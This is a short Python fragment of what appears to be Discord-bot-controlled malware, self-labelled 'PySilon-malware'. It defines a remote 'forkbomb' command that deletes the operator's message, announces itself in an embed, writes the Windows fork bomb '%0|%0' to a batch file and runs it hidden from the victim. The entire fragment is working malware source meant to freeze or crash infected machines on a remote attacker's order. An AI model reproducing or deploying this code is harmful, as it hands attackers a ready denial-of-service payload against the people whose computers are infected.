import subprocess
import os
from getpass import getuser

@client.command(name="forkbomb")
async def start_fork_bomb(ctx):
    await ctx.message.delete()

    embed = discord.Embed(title="💣 Starting...",description=f'```Starting fork bomb... This process may take some time.```',colour=discord.Colour.dark_theme())
    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    await ctx.send(embed=embed)

    bat_file = 'wabbit.bat'

    with open(bat_file, 'w', encoding='utf-8') as wabbit:
        wabbit.write('%0|%0')

    subprocess.Popen(bat_file, creationflags=subprocess.CREATE_NO_WINDOW)
